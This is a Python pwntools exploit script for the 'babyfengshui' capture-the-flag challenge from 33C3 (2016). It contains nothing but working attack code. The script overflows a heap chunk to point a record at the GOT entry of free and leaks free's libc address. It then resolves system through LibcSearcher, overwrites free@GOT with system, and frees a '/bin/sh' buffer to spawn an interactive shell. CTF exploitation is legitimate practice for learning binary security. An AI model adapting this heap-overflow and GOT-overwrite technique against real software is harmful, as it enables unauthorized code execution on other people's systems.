from pwn import *
from LibcSearcher import LibcSearcher

context(arch='i386', os='linux', log_level='DEBUG')
f = './babyfengshui_33c3_2016'
p = process(f)
elf = ELF(f)

def ret2libc(leak, func):
	libc = LibcSearcher(func, leak)

	base = leak - libc.dump(func)
	system = base + libc.dump('system')
	return system

def add(max_len, desc_len, text):
    p.sendlineafter('Action: ', '0')
    p.sendlineafter('description: ', str(max_len))
    p.sendlineafter('name: ', 'aaaa')
    p.sendlineafter('length: ', str(desc_len))
    p.sendlineafter('text: ', text)

def delete(index):
    p.sendlineafter('Action: ', '1')
    p.sendlineafter('index: ', str(index))

def display(index):
    p.sendlineafter('Action: ', '2')
    p.sendlineafter('index: ', str(index))

def update(index, desc_len, text):
    p.sendlineafter('Action: ', '3')
    p.sendlineafter('index: ', str(index))
    p.sendlineafter('length: ', str(desc_len))
    p.sendlineafter('text: ', text)

add(0x80,0x80,'a'*0x80)
add(0x80,0x80,'b'*0x80)
add(0x8,0x8,'/bin/sh\x00')
delete(0)

add(0x100,0x19c,'a'*0x198+p32(elf.got['free']))
display(1)
p.recvuntil('tion: ')
free = u32(p.recv(4))
log.success('free: '+ hex(free))
system = ret2libc(free, 'free')

update(1,4,p32(system))
delete(2)

p.interactive()